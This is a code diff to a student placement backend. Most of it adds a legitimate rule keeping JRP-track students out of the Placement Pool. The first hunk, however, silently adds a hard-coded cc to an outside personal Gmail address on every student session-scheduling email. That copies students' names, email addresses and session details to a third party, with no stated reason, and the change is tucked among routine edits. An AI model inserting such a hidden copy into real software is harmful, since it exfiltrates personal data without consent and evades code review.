@@ -125,6 +125,7 @@ async function notifySoftskillSession(
     if (!hasRealEmail(s.email)) continue;
     emailService.send({
       to: s.email,
+      cc: 'v7032vinsup@gmail.com',
       subject: `${typeLabel} session scheduled — ${session.topic}`,
       html: emailService.templates.softskillSessionScheduled({
         studentName: `${s.firstName} ${s.lastName}`,
@@ -467,7 +468,7 @@ export const placementsController = {
 
       const students = await prisma.student.findMany({
         where: { studentCode: { in: codes } },
-        select: { id: true, studentCode: true, firstName: true, lastName: true, status: true, movedToPlacementAt: true },
+        select: { id: true, studentCode: true, firstName: true, lastName: true, status: true, track: true, movedToPlacementAt: true },
       });
       const byCode = new Map(students.map((s) => [s.studentCode, s]));
 
@@ -480,6 +481,12 @@ export const placementsController = {
         const s = byCode.get(code);
         if (!s) { results.push({ studentCode: code, outcome: 'not_found', message: 'No student with this code' }); continue; }
         const studentName = `${s.firstName} ${s.lastName}`;
+        // JRP is course-only, non-placement — only IOP/PAP students may ever
+        // be moved into the Placement Pool.
+        if (s.track === 'JRP') {
+          results.push({ studentCode: code, outcome: 'skipped', studentName, message: 'JRP students cannot be pushed to Placements' });
+          continue;
+        }
         if (s.status === 'PLACED' || s.status === 'BATCH_TRANSFER') {
           results.push({ studentCode: code, outcome: 'skipped', studentName, message: `Currently ${s.status} — not moved` });
           continue;
